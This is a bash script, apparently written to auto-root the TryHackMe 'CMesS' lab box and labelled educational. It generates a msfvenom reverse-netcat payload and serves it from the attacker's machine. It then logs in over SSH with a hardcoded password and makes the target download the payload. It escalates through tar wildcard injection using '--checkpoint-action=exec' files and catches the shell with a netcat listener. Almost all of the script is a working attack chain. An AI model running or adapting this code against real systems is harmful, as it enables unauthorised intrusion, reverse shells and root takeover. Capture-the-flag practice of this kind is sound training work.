#!/bin/bash

# This script is used for educational purposes
# ============================================
# Autoroot script for TryHackMe CMesS room
# It uses a vulnerability used in wildcards 
# You can read about it here:
# https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/


PORT=''
ip="$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)"
TARGET=''

RED='\033[0;31m'
WHITE='\033[1;37m'
plus='\033[0;32m[+]'

usage(){
	echo "USAGE: bash cmessauto.sh -l -p [1337] -t [target]"
	echo "[-l] Is required"
	echo "[-p] Specify a port"
	echo "[-t] Target of box"
}

while getopts "lt:p:" OPTION
do
	case $OPTION in
		l)
			echo -e "${plus} ${WHITE}Setting LHOST to ${RED}$ip${WHITE}" >&2
			;;
		t)
			TARGET=$OPTARG
			echo -e "${plus} ${WHITE}Setting target to ${RED}$TARGET${WHITE}" >&2
			;;
		p)
			PORT=$OPTARG
			echo -e "${plus} ${WHITE}Setting port to ${RED}$PORT${WHITE}" >&2
			;;
	esac
done

if [[ $1 == "" ]]; then
	usage
	exit;
fi


# MSFVenom payload for crontab wildcard injection
echo -e "${plus} ${WHITE}Creating payload"
msfvenom -p cmd/unix/reverse_netcat lhost=$ip lport=$PORT R > msf.txt 2>/dev/null

# Starting python server in background
echo -e "${plus} ${WHITE}Starting python server with ${RED}port 8000${WHITE}"
python -m SimpleHTTPServer 8000 & 2> /dev/null &
sleep 3

# SSH into andre
echo -e "${plus} ${WHITE}SSH into andre"
echo ""
sshpass -p "UQfsdCB7aAP6" ssh -o "StrictHostKeyChecking no" andre@$TARGET 'ip=($SSH_CLIENT); cd backup; echo -e "[+] Getting payload file";wget $ip:8000/msf.txt 2>/dev/null | grep "saving"; cat msf.txt  > shell.sh; echo -e "" > "--checkpoint-action=exec=sh shell.sh"; echo -e "" > --checkpoint=1;'

echo -e "${plus} ${WHITE}Opening new terminal for ${RED}netcat listener${WHITE}"
x-terminal-emulator -e  nc -lvnp $PORT 2>/dev/null
